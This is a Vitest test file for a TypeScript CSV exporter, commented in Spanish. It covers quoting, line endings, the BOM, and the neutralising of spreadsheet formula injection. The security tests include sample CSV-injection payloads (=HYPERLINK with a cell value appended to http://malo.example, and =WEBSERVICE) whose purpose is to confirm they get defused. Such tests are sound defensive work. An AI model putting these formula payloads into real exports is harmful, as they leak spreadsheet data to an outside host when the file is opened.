import { describe, expect, it } from 'vitest';
import { BOM, aCsv, celda, neutralizarFormula, type Columna } from './csv.js';

describe('celdas del CSV', () => {
  describe('SEGURIDAD: inyeccion de formulas', () => {
    // El contenido de la evidencia lo escribe el modelo a partir del archivo
    // que subio el candidato. Una celda que empieza por = es una formula para
    // Excel, LibreOffice y Sheets, y se ejecuta al abrir el archivo.
    it.each(['=', '+', '-', '@', '\t', '\r'])('neutraliza lo que empieza por %j', (inicio) => {
      expect(neutralizarFormula(`${inicio}algo`)).toBe(`'${inicio}algo`);
    });

    it('neutraliza una formula que se lleva datos a una URL', () => {
      const ataque = '=HYPERLINK("http://malo.example/?"&A1,"Haz clic")';
      expect(celda(ataque)).toBe(`"'${ataque.replace(/"/g, '""')}"`);
    });

    it('neutraliza la formula aunque venga dentro de una tabla completa', () => {
      const filas = [{ evidencia: '=WEBSERVICE("http://malo.example")' }];
      const columnas: Columna<{ evidencia: string }>[] = [
        { titulo: 'Evidencia', valor: (f) => f.evidencia },
      ];

      expect(aCsv(filas, columnas)).toContain(`'=WEBSERVICE`);
    });

    it('no toca un texto normal: la defensa no puede ensuciar el reporte', () => {
      expect(celda('Resolvio el ejercicio con una lista enlazada')).toBe(
        'Resolvio el ejercicio con una lista enlazada',
      );
      // Un numero negativo es un numero, no una formula, pero llega como texto
      // "-3" y empieza por un caracter peligroso. Se neutraliza: es preferible
      // un apostrofo delante de un -3 que una formula ejecutandose.
      expect(celda(-3)).toBe("'-3");
    });
  });

  describe('reglas del RFC 4180', () => {
    it('entrecomilla lo que lleva una coma', () => {
      expect(celda('Rojas, Ana')).toBe('"Rojas, Ana"');
    });

    it('duplica las comillas y entrecomilla', () => {
      expect(celda('dijo "listo"')).toBe('"dijo ""listo"""');
    });

    it('entrecomilla lo que lleva un salto de linea', () => {
      expect(celda('linea uno\nlinea dos')).toBe('"linea uno\nlinea dos"');
    });

    it('un vacio y un ausente quedan como celda vacia', () => {
      expect(celda(null)).toBe('');
      expect(celda(undefined)).toBe('');
      expect(celda('')).toBe('');
    });

    it('las fechas van en ISO, que es lo unico que no depende del idioma', () => {
      expect(celda(new Date('2026-10-04T15:30:00.000Z'))).toBe('2026-10-04T15:30:00.000Z');
    });
  });
});

describe('armado del CSV', () => {
  interface Fila {
    posicion: number;
    nombre: string;
    nota: number;
  }

  const columnas: Columna<Fila>[] = [
    { titulo: 'Posicion', valor: (f) => f.posicion },
    { titulo: 'Candidato', valor: (f) => f.nombre },
    { titulo: 'Nota', valor: (f) => f.nota },
  ];

  it('pone la cabecera y una linea por fila, separadas con CRLF', () => {
    const csv = aCsv(
      [
        { posicion: 1, nombre: 'Ana', nota: 90 },
        { posicion: 2, nombre: 'Luis', nota: 70 },
      ],
      columnas,
    );

    expect(csv).toBe(`${BOM}Posicion,Candidato,Nota\r\n1,Ana,90\r\n2,Luis,70\r\n`);
  });

  it('empieza con el BOM: sin el, Excel en Windows destroza los acentos', () => {
    expect(aCsv([{ posicion: 1, nombre: 'Peña', nota: 90 }], columnas).startsWith(BOM)).toBe(true);
  });

  it('sin filas deja la cabecera: un reporte vacio es una respuesta valida', () => {
    expect(aCsv([], columnas)).toBe(`${BOM}Posicion,Candidato,Nota\r\n`);
  });
});
